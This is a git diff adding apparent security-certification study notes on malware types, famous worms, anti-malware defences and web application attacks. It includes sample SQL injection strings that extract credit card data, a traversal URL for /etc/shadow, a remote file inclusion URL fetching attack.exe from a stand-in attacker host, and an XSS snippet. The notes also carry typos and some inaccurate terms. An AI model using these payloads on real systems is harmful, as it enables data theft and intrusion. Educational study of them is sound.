@@ -4276,6 +4276,425 @@ The above approache allows TLS to leverage (1) advanced functionality of asymmet
 
 ![Replay Attack](./images/replay_attack.jpg)
 
+### Malware
+
+* aka Malicious Software
+* includes a broad range of software threats that exploit various network, OS, software, and phyiscal security vulnerabilities to spread malicious payloads to computer systems
+* quite common for the same piece of malware to exhibit characteristics from several different categories making it difficult to it malware into distinct buckets
+* over 1.347 billion strains of malicious code roaming the global network since 1984
+* 5,900,949 new malware appearing on the internet in the first two weeks of 2024
+* **_Sources of Malicious Code_**
+  * malicious code writers originally were very skilled (misguided) software developers who took pride in carefully crafting innovative malicious code techniques
+    * mostly to expose security vulnerabilities in software for security awareness reasons
+  * **Script Kiddies**
+    * malicious individual who doesn’t understand the technology behind vulnerabilities, but downloads and launches ready to use tools
+    * Often located in countries with weak law enforcement, use malware to steal money and identities.
+    * [Zeus Trojan Horse](https://en.wikipedia.org/wiki/Zeus_(malware))
+      * used on versions of Microsoft Windoes
+      * widely believed to be the product of an Eastern European organized crime ring seeking to infect as many systems as possible to log keystrokess and harvest online banking passwords using MiTM attacks
+      * first surfaced in 2007 but continues to be updated and found in new variants today
+  * **Advanced Persistent Threat(APT)**
+    * sophisticated adversaries with advanced technical skills and financial resources
+    * Often military units, intelligence agencies, or shadowy groups whom are likely affliated with government agencies
+    * have access to zero day exploits that are not known to software vendors (no patch or update for it) highly effective
+    * malware built is highly target, designed to impact only small number of adversaries (often as small as one)
+    * difficult to defeat
+    * [Stuxnet]()
+* Types
+  * **_Virus_**
+    * earliest form of malicious code
+    * designed in hopes of bypass anti-virus/anti-malware tooling
+    * two main functions
+      * **_Propagation_**
+        * defines how the virus will spread from system to system
+        * infecting each as it goes
+        * delivers the malicious payload
+      * **_Destruction_**
+        * payload execution
+        * could be instant of time delay
+        * cause damage and destruction
+    * **Propagation Techniques**
+      * **_Master Boot Record (MBR) Viruses_**
+        * _boot sector_ and _MBR_ are used interchangebly however
+          * MBR is a single sector (normally the first) which reads in the initial stages of the boot process
+          * MBR determines which media partition contains the OS and direct its to read that partition's boot sector to load the OS
+        * viruses can attack both the MBR and the Boot Sector
+          * **_Boot Sector Virus_**
+            * virus infects the legitimate boot sector and are loaded into memory during the OS load process
+        * ealiest known forms of virus infection
+        * attack bootable media (hard disk or flash media) which the computer requires to boot normally and load start up items (drives, disks, etc) (boot process)
+        * MBR is extermely small (~512 bytes) it can't contain all the code required to implement the virus's propogation and destructive functions
+        * to by pass the space limits, MBR virus stores the majority of their code on another portion of storage media
+          * system reads the infected MBR, the virus instructs it to read and execute the code in the alternate location (loadign the entire virus in memory and tirgger delivery)
+        * spread via infected media inadvertently shared between users
+        * Using Trusted Platform Modules (TPM) can control against MBR viruses
+      * **File Infector Viruses**
+        * affects executable files
+        * common Windows files ending in `.exe`, `.com`, `.msc` 
+        * alter code of executables to include the technology the virus requires for propogation and damage
+        * those that don't use cloaking or stealth techniques to hide are often easily detected by comparing files characteristics (size, mod date) before and after infection or by comparing file hashes
+        * **_Companion Virus_**
+          * variation of File Infector Virus
+          * are self-contained executable files that escape detection by using a filename similar to, but slighly different from a legitimate OS system file
+          * rely on the default filename extensions that Windows-based systems append to commands when executing program files (`.com`, `.exe`, and `.bat` in that order)
+            * example legit file name `game.exe` in which a companion virus may use `game.com`, if you type `GAME` in a command prompt the OS would execute the virus instead of the actual program
+          * avoid shortcuts
+      * **Macro Viruses**
+        * leverage scripting functionality of other software (i.e Visual Basic for Applications (VBA))
+        * first appeared in the mid-1990s
+        * originally started infecting documents created in Word and relatively unsophisticated, they spread like wild fires (antivirus community didnt anticipate them)
+          * not protection from antivirus tooling
+        * quickly become more commonplace
+        * vendors rushed to include these in antivirus platforms
+        * [Melissa Virus](https://en.wikipedia.org/wiki/Melissa_(computer_virus))
+          * spread though the use of Word document that exploited a security vulnerability in MS Outlook to replicate it in 1999
+        * [I Love You Virus](https://en.wikipedia.org/wiki/ILOVEYOU)
+          * quickly followed on the heels of _Melissa_, exploiting similar vulnerabilities in early 2000,
+        * Vendors (ie. Mircrosft, Google (Workspace)) implemented changes on how macros are used
+          * retricted the ability of untrusted macros to run without explicity user permission
+          * drastic reduction in macro viruses
+      * **Service Injection Viruses**
+        * inject into trusted runtimes like `svchost.exe`, `explorer.exe`, and `winlogon.exe`
+        * able to bypass anti-virus platforms
+        * best protection is ensureing all software allowing viewing of web content is updated and patched
+    * **Virus Technologies**
+      * Four types use to avade detection
+        * **_Multiparite Viruses_**
+          * type of computer virus that infects a system through multiple vectors, typically including both executable files and boot sectors
+          * Examples:
+            * The [Ghostball virus](https://en.wikipedia.org/wiki/Ghostball_(computer_virus)), discovered in 1989, is considered the first multipartite virus.
+            * The [Tequila virus](https://www.f-secure.com/v-descs/tequila.shtml), which emerged in 1991, targeted MS-DOS systems by infecting both executable files and the boot sector, according to Binary IT
+        * **_Steal Virues_**
+          * a type of malware designed to avoid detection by antivirus software and other security measures
+          * uses various techniques to hide its presence and malicious activities, making it difficult to identify and remove
+          * employ various methods to hide their existence, such as renaming themselves, moving to different locations, or manipulating system processes
+        * **_Polymorphic Viruses_**
+          * a type of malware that changes its code each time it replicates or infects a new system, making it difficult to detect using signature-based antivirus software
+          * ability to constantly mutate its code while maintaining its core functionality allows it to evade traditional security measures
+          * can be detected by anti-virus/malware solutions
+            * takes them longer to generate signature files to stop them in their tracks
+        * **_Encrypted Viruses_**
+          * use cryptgraphic techiques to avoid detection
+          * similar to polymorphic
+          * alter the way they are stored on disk
+          * use very short segement of code, known as the _virus decryption routine_
+            * contains the cryptographic infromation necessary to load and decrypt the main virus code stored elsewhere on the disk
+            * each infection uses a different crypto key, cause the main code to appear different on each system
+            * often contains telltale signatures that render to them vulnerable to updated anti-virus software packages
+      * **Hoaxes**
+        * nuisance and wasted resources
+        * purported "virus"
+        * circulate via social media
+        * [List of hoax viruses](https://www.snopes.com/tag/virus-hoaxes-realities)
+      * [**Logic Bomb**](https://en.wikipedia.org/wiki/Logic_bomb)
+        * lies dormant until triggered by one or more met conditions like time, a program launch, etc.
+        * programmed into custom-built applications by engineers seeking to ensure their work is destroyed if they unespectedly leave the company
+        * Example
+          * March 2013 - South Korea
+            * logic bomb targeted media organizations and financial institutions cause both system outags and data loss
+            * triggered a military alert when the South Korean government suspected that the logic bomb was the prelude to an attack by North Korea
+          * July 2019
+            * Contractor working for Siemens Corporation pled guilty to including a logic bomb in software that he created under contract
+            * it was meant to periodically break the software so Siemens would hire him back to fix it (guaranteed business stream)
+            * carried this out for more than two years before being caught and sentenced to 6-months in prison
+      * [**Trojan Horses**](https://en.wikipedia.org/wiki/Trojan_horse_(computing))
+        * software that appears benevolent but carries a malicious payload to wreck havoc on a system or network
+        * differ widely in functionality
+          * some will destroy stored data on a system in an attempt to cause large amounts of damage in a short period
+          * other are fairly innocuous
+            * Example:
+              * Series of Trojans (XBox Trojans) claimed to provide PC users with the ability to run games designed by Microsoft XBox gaming system ont their PCs
+              * When it ran it didnt work, but it did modify the Windows Registry with a value that caused a specific web page to open each time the computer booted
+              * hoping to cash in on ad revnue generated by the large number of page views their website recieved, however it was picked up by antivirus tech and the website was shutdonw
+          * [**_Remote Access Trojans (RATs)_**](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-remote-access-trojan)
+            * subcategory of Trojans
+            * open backdoors in systems that grant the attcker remote admin access of an infected system
+              * ex SSH port that gives them access
+          * **_Cyptomalware_**
+            * type of Trojans the use crypto mining (Bitcoin, etc) for financial gain
+  * **Worms**
+    * propagates themselves without requiring human intervention
+    * Specific Types of Worms
+      * [**_Code Red Worm_**](https://en.wikipedia.org/wiki/Code_Red_(computer_worm))
+        * summer of 2001, rapidly spread among unpatched Microsoft IIS servers
+        * performed three malicious actions on systems it penetrated
+          * **Webpage Defacement**:
+            * The worm would replace the content of the infected website's main page with a message that read: "HELLO! Welcome to http://www.worm.com ! Hacked By Chinese!" This defacement was temporary, and the original page would return after 10 hours unless the system was re-infected.
+          * **Self-Replication and Spreading**:
+            * For the first 19 days of the month, the worm's primary function was to replicate itself.
+            * It would scan the internet for other computers running the vulnerable version of Microsoft's Internet Information Services (IIS) web server software
+            * Once it found a vulnerable server, it would exploit a buffer overflow vulnerability to infect it and then repeat the process, leading to exponential growth in infections.
+          * **Distributed Denial-of-Service (DDoS) Attack**:
+            * From the 20th to the 27th of the month, the worm would stop spreading and launch a coordinated DDoS attack.
+            * All the infected machines would flood a specific IP address (`192.137.240.91`) with a massive amount of data, overwhelming the targeted server and making it unavailable. 
+            * The primary target for this attack was the website for the White House
+      * [**_RTM and the Internet Worm_**](https://en.wikipedia.org/wiki/Morris_worm)
+        * aka The Morris Worm
+        * was one of the first computer worms to gain widespread media attention
+        * created in 1988 by Robert Tappan Morris (RTM)
+        * computer worm is a type of standalone malware that can self-replicate and spread to other computers on a network without needing a host program or human interaction.
+        * The Morris worm was designed to exploit vulnerabilities in Unix operating systems and spread across the early Internet
+        * While it was not intended to be malicious and did not have a destructive payload that deleted files, a programming error caused it to replicate uncontrollably
+        * This led to thousands of computers being infected and overloaded, causing significant network slowdowns and crashes
+        * The incident highlighted the vulnerability of interconnected computer networks and led to the creation of the first Computer Emergency Response Team (CERT)
+        * This video provides a short history of the first Internet worm - [The First Internet Worm (Morris Worm)](https://www.youtube.com/watch?v=2QwMv0_Rkec&pp=0gcJCfwAo7VqN5tD)
+        * Unix specific security holes this exploited
+          * **Sendmail Debug Mode Backdoor**
+            * The worm exploited a known "debug" mode backdoor in the sendmail program.
+            * This flaw allowed an attacker to execute commands remotely with the highest level of system privileges.
+            * The worm used this vulnerability to run code on a target machine, effectively giving it control.
+          * **Fingerd Buffer Overflow**
+            * The worm exploited a buffer overflow vulnerability in the `fingerd` network service.
+            * This service provided information about users on a system. By sending a string of data that was longer than the service was designed to handle, the worm could overwrite part of the program's memory with its own code, allowing it to execute and gain access.
+          * **Weak Passwords**
+            * The worm included a built-in dictionary of common passwords and user names.
+            * It would attempt to guess passwords for various user accounts on a system.
+            * If it successfully guessed a password, it would use it to log in and spread to other machines using that account's credentials.
+          * **"Trusted Host" (Trust Relationships) Access**
+            * The worm exploited the "trusted host" feature of the `rsh` and `rexec` protocols, which allowed a user from a "trusted" machine to log in to another machine without a password. 
+            * The worm searched for these trusted relationships and, once it found one, used it to spread to other hosts on the network.
+        * [**_Stuxnet_**](https://en.wikipedia.org/wiki/Stuxnet)
+          * surfaced on the Internet in the mid-2010
+          * highly sophisticated worm which used a variety of advanced techniques to spread, including multiple previously undocumented vulnerabilities
+          * uses the following propagation techniques:
+            * Searching for unprotected administrative shares of a system on the LAN
+            * Exploiting zero-day vulnerabilities in the Windows Service service and Windows Print Spooler service
+            * Connecting to systems using a default database password
+            * Spearding by the use of shared infected USB drives
+          * was searching for a specific type of system -- one using a controller manufactured by Siemens and allegedly using the production of material for nuclear weapons.
+            * when discovered it executed a series of actions designed to destroy centerfuges attached to the Siemens controller
+          * first appeared and spread in the Middle East (mostly Iran)
+            * allegedbly design by the Western nations with the intent of disrupting an Iranian nuclear program
+          * _New York Times Article_, a facility in Isreal contained equipement used to test the worm
+            * Stated "Isreal has spun nuclear centrifuges nearly identical to Iran's" and continued "..the operations there, as well as related efforts in the US, are ... clues that the virus was designed as an American-Israeli project to sabatoge the Iranian Program"
+          * if all the allegation are true, _Stuxnet_ marks two major evolutions in the world of malicious code
+            * use of a worm to cause major phyiscal damage to a facility
+            * use of malicious code in warfare between nations
+  * **Spyware and Adware**
+    * aka _Perpetually Unwanted Programs (PUPs)_
+    * _Spyware_ - monitors and transmits your actions to a remote system that spies on your activity
+    * _Adware_ - shows you advertisements on infected systems (pop-ups while surfing the web) some may even monitor your shopping behavior
+  * **Ransomware**
+    * weaponized cryptography
+    * encrypts files and demands payment in exchange for the decryption key
+    * been around since the late 1980s (89)
+    * using backups will take time to recover where some organizations (who are not as mature in DR) will likely pay the ransom
+    * paying the ransome may be illegal
+      * In 2021, US Department of the Treasury's office of Foreign Affaires Control (OFAC) informed firms that many ransomware authors are subject to economic sanctions, making payments to them illegal
+        * [Full Advisory Report](https://ofac.treasury.gov/media/912981/download?iniline)
+  * **Malicious Scripts**
+    * Use of Powershell or Bash to automate malicious routines
+    * aka _Fileless Malware_
+    * never write files to disk, making the more difficult to detect
+    * typically run through a malicious link that the user clicks on in a phishing message and exploit a browser vulnerability to execute code that downloaded and runs entirely in memory
+  * **Zero-Day Attacks**
+    * Security flaws discovered by attackers that have not been thoroughly addressed by the security community
+    * two reasons:  
+      * _"Window of vulnerability"_
+        * the necessary delay between discovery of a new type of malicious code and the isuance of patches/antivirus updates creates a window for zero day attacks
+      * Slowness in applying updates ont he part of the sys admins
+    * critical to have defense-in-depth approach to cybersecurity with overlapping controls that will have an effect even if ano fails
+
+#### Malware Prevention
+
+* According to [AV-Test.org](http://av-test.org) in 2020 researchers estimated that 83% of malware in existence targets the Windows platform
+  * used to be 95% as now targets are also mobile devices and other platforms (i.e Mac recently tripled)
+* **Anti-malware Software**
+  * **_Signature-Based Detection_**
+    * large database of characteristics that indentify viruses
+  * some also use Heuristic Mechanisims which examines the behavior of software to look for bad behavior
+  * Process when a a file matches signatures
+    * Eradicates virues (if possible), disinfects the affect file, and restores the machine to a safe condition
+    * Quarantine - isolate but not remove, admin can descide what to do
+      * files may be removed if security settings/policies do not provide for quarrantine or the files exceed a predefined danger threshold, in order to preseve the safety of the systek
+    * Require frequent updates
+  * can have central monitoring
+  * check with vendor of new threats
+* **Integrity Monitoring**
+  * compares archived file hashes stored on a database with current compute file hashes of the files stored on the system and alerts on file modification
+* **Advanced Threat Protection**
+  * **_Endpoint detection and response (EDR)_**
+    * combine anit-malware capabilities with advanced detection and remeidation techniques
+      * Features
+        * Analyzing endpoint memory, file system, and network activity for signs of malicious activity
+        * Automatically isolating possible malicious activity to contain the potential damage
+        * Integration with threat intelligence sources to obtain real-time insight into malicious behavior elsewhere on the Internet
+        * Integration with other incident response mechanisms to automate response efforts
+    * vendors offer as a managed service known as _Managed Detection and Response (MDR) Services_
+  * **_User and Entity Behavior Analytics (UEBA)_**
+    * analyzes user-based activities on endpoints and other devices
+    * builds a profile of each individual's normal activity and highlights deviations from that profile that may indicate a potential compromise
+
+### Application Attacks
+
+* **Buffer Overflows**
+  * vulnerability exist when a developer does not properly validate user input to ensure that its of an appropriate size
+  * inputs that are too large can "overflow" a data structure and affect other data stored in the computer's memory
+  * attackers can exploit this to run / execute targeted commands on the server
+  * highly common in code developed rapidely for web using [Common Gateway Interface (CGI)](https://en.wikipedia.org/wiki/Common_Gateway_Interface) or other programming languages that allow unskilled programmers to quickly create interactive web pages
+  * Simple checks to perform
+    * User can't enter a value longer than the size of any buffer that will hold it
+      * example a 10-letter word into a 5-letter string variable
+    * User can't enter an invalid value for the variable types that will hold it
+      * example a letter into a number variable
+    * User can't enter a value that will cause the program to operate outside its specified parameters
+      * example yes or no question with maybe
+* **Time of Check (ToC) to Time of Use (ToU) Attacks**
+  * attackers can develop attacks based on predictablility of task execution
+  * aka _race conditions_
+    * attack is racing with the legitimate process to replace the object before it is used
+  * type of _state attack_ due to the attack on timing, data flow control, and transition between one system state to another
+  * **_Time of Check (ToC)_**
+    * time at which a subject checks on the status of the object
+    * may be several decisions to make before returning to the object to access it
+    * when a decision is made to access the object, the procedure accesses it the _(ToU)_
+  * **_Time of Use (ToU)_**
+    * time at which the subject accesses the object following a decision making process
+  * Difference between ToC and ToU is sometimes large enough for an attacker to replace the original object with another object that suits their own needs
+* **Backdoors**
+  * undocumented command sequences that allow inidividuals with the knowledge of the backdoor to bypass normal access restrictions
+  * often used during development and debugging process to speed up the workflow and avoid forcing developers to authenticate
+  * maybe left it in a production state (by accident or to "take a peek" while processing sensitive data)
+  * may also be created by malicious code that can privode remote access
+* **Privelge Escalation and Rootkits**
+  * **_Privilege Escalation_**
+    * users gains access using a normal compromised normal account and gains access to more comprehensive admin access
+    * waged through rookits or fileless malware/malicious scripts
+  * **_Rookits_**
+    * exploit known vulnerabilities in various OS
+    * attackers often obtain access to a standard system user account through the use of a password attack or social engineering and then use a rootkit to increase their access to root or admin
+    * triggers privilege escalation attacks
+* **Injection Vulnerabilities**
+  * type of attack that targets and break web applications
+  * allows attacker to supply some type of code as input to the web app and trick the server to execute the command
+  * **_SQL Injection Attacks_**
+    * web apps recieve inputs from users and use it to compose a DB query that provides results
+    * Example search for the terms `orange tiger pillows`:
+    ```SQL
+    SELECT ItemName, ItemDescription, ItemPrice
+    FROM Products
+    WHERE ItemName LIKE '%orange%' AND 
+    ItemName LIKE '%tiger%' AND 
+    ItemName LIKE '%pillows%';
+    ```
+    * however the attacker can use the following list of items to sabotage things
+      * `orange tigre pillows'; SELECT CustomerName, CreditCardNumber FROM Orders; --`
+    * The web server passes this to the query engine and generates teh following SQL command to execute
+    ```SQL
+    SELECT ItemName, ItemDescription, ItemPrice
+    FROM Products
+    WHERE ItemName LIKE '%orange%' AND 
+    ItemName LIKE '%tiger%' AND 
+    ItemName LIKE '%pillows%';
+    SELECT CustomerName, CreditCardNumber
+    FROM Orders;
+    --%'
+    ```
+    * If the command is successful it will run two different queries and return sensitive data
+    * can be used to drop tables, delete records etc
+  * **_Blind (Content-Based) SQL Injection_**
+    * attacker sends input to the web app that tests whether the application is interpreting injected code before attempting to carry out an attack
+    * Example a form asks for an account number the following query will be generated
+    ```SQL
+    SELECT FirstName, LastName, Balance
+    FROM Accounts
+    WHERE AccountNumber = '$account';
+    ```
+       * `$account` field is populated from the input
+    * an attack inputs the following `52019' OR 1=1;--`
+    * If successful this would result in the following query being sent
+    ```SQL
+    SELECT FirstName, LastName, Balance
+    FROM Accounts
+    WHERE AccountNumber = '52019' OR 1=1;
+    --'
+    ``` 
+      * The above query will now match all results
+  * **_Blind (Timing-Based) SQL Injection_**
+    * type of attack or pentesting where the use of the amount of time required to process a query as a channel for retrieving information from a database
+    * attack depends on delay mechanisms provided by different database platforms
+      * MS SQL Server's T-SQL allows a user to specify a command such as this `WAITFOR DELAY '00:00:15'`
+        * this instructs the db to wait 15 seconds before performing the query/next action
+  * **_Code Injection Attacks_**
+    * insert attacker-written code into the legitimate code created by the developers
+    * Cross-Site Scripting, etc
+    * **_LDAP Injection Attack_**
+      * type of code injection attack
+      * commands embedded into text input being sent to an LDAP server used to extract directory information
+    * **_XML Injection Attack_**
+      * targets XML based applications
+    * **_Dynamically Linked Libraries (DLL) Injection Attack_**
+      * attack that attempts to load malicious DLLs
+  * **_Command Injection Attacks_**
+    * attack that involves executing arbitrary commands on a host operating system (OS)
+
+
+### Exploiting Authroization Vulnerabilities
+
+* Vulnerabilities that allow an attacker to exceed the level of access they are authorized
+* [OWASP Top 10 - Web Application Security Risk](https://owasp.org/www-project-top-ten)
+* [OWASP Top 10 - Proactive Controls](https://owasp.org/www-project-proactive-controls)
+* **_Insecure Direct Object References_**
+  * retrieve info from a DB based on an argument
+    * Ex: `https://www.companyname.com/getDocument.php?documentID=82
+  * application should implement authN/authZ mechanisms to limit access
+  * there are not mechanims in place an attacker can just change the `documentID` argurment to a different number to see what happends
+* **_Directory Traversal_**
+  * misconfiguraitons on the web server that exposes the entire file/directory structure
+  * attackers attempt to navigate they file system of the server
+    * ex: `https://www.mycompany.com/../../../etc/shadow`
+* **_File Inclusion_**
+  * extension of directory traversal
+  * actually executes the code contained within a file, which allows the attacker to fool the server
+  * Two Variants
+    * **_Local file inclusion_**
+      * attack seeks to execute code stored in a file located elsewhere on the web server
+      * works similarly to directory traversal
+      * example:
+        * attacker may use the following URL to execute a file named `attack.exe` that is stored on `C:\www\uploads` directory
+        * `http://www.mycompany.com/app.php?include=C:\\wwww\\uploads\\attack.exe`
+    * **_Remote file include_**
+      * allows an attacker to execute code stored on a remote server
+      * `http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe`
+  * typically a vulberability exploit to upload a _web shell_
+    * allows attack to excute the commands on the server and view the results
+
+### Exploiting Web Application Vulnerabilities
+
+* **Cross-Site Scripting (XSS)**
+  * type of attack that occurs when the web applications allow an attacker to perform HTML injection, inserting their own HTML code into a web page
+  * **_Refelected XSS_**
+    * typically occure when an application allows _reflected input_
+      * an app that ask to input their name and the system responds back `Hello, David`
+    * an attacker code submit a `<SCRIPT />` tag into the input field
+      * Input: `Mike<SCRIPT>alert('hello')</SCRIPT>`
+      * the browser processes this and pops up an alert with hello
+    * can be far more malicious such as a script asking for the users password and transimits it to a malicious third party
+  * Use **input validation** to solve this
+  * **_Output Encoding_**
+    * techniques that take user-supplied input and encodes it using a series of rules that transforms potentially dangerous content into a safe form
+    * example the `'`(single quote) encoded looks like `$#x27;`
+  * See [OWASP XSS Prevention Cheat Sheet](https://owasp.gov/cheatsheets/Cross_Site_Scripting_Prevention_Chear_Sheet.html)
+* **Stored/Persistent XSS**
+  * malicious scripts are injected into a website and stored on its server, later to be executed when other users visit the compromised pages
+  * type of XSS attack
+* **Request Forgery**
+  * exploit trust relationships and attempt to have users unwittingly execute commands against a remote server
+  * Two Forms:
+    * **_Cross-Site Request Forgery (CSRF/XSRF)_**
+      * type of web security vulnerability where an attacker tricks a user into performing actions on a website they are already authenticated to, without their knowledge or consent. 
+      * Essentially, an attacker crafts a malicious link or request that, when clicked or accessed by a logged-in user, causes the user's browser to unknowingly send unintended commands to the targeted website.
+      * validate orginating domain (origin) and uses secure tokens
+      ![CSRF](./images/CSRF.jpg)
+    * **_Server-Side Request Forger (SSRF)_**
+      * web security vulnerability that allows an attacker to induce a server-side application to make HTTP requests to an arbitrary domain, potentially including internal systems and services. This exploitation can lead to unauthorized access to sensitive data, remote code execution, and other serious security breaches.
+      * typically if a server has access to a non-public urls
+      ![SSRF](./images/SSRF.jpeg)
+* **Sesion Hijacking**
+  * involves an attacker using captured, brute forced or reverse-engineered session IDs to seize control of a legitimate user's session while that session is still in progress.
+  * can be done through cookie theft (connection was not properly close or a fault app design that exposes the cookie info), MiTM attack
+  ![Session Hijack](./images/session-hijack.png)
+
 
 * Pass the hash
 * Kerberos exploitation
